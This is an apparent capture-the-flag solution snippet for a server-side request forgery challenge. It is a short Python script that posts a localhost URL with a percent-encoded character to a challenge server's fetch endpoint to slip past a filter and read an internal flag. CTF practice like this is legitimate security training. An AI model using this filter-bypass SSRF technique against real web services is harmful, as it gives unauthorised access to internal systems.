Server-Side Request forgery

Example:

```py
import requests

base="https://secret-tunnel.chal.nbctf.com/"

r=requests.post(base+"/fetchdata",data={"url":"https://localhost:1337/%66flag"})
print(r.text)
```
